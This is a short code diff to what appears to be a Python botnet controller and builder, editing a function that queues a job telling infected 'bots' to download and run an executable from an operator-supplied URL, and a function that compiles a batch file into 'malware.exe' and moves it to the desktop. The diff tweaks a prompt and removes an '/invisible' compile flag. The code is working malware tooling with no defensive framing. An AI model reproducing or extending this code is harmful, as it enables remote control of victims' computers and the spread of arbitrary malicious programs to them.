@@ -158,7 +158,7 @@ def use():#working
 
 
 def custom():#working
-    open('jobs','w').write('c '+input('Enter the URL of the file you want the bots to run '))
+    open('jobs','w').write('c '+input('Enter the URL of the file you want the bots to run(exe files only) '))
     print('Data added to bot jobs')
     system('pause')
     main()
@@ -201,7 +201,8 @@ def make():#working
     open('setup.exe.bat','w').write(a)
 
     print('Compiling malware...')
-    system('b2e.exe /bat setup.exe.bat /exe malware.exe /invisible /include win.exe /overwrite')
+    #system('b2e.exe /bat setup.exe.bat /exe malware.exe /invisible /include win.exe /overwrite')
+    system('b2e.exe /bat setup.exe.bat /exe malware.exe /include win.exe /overwrite')
 
     print('Compilation of file completed, moving file to desktop..')
     system(r'move malware.exe %userprofile%\Desktop')
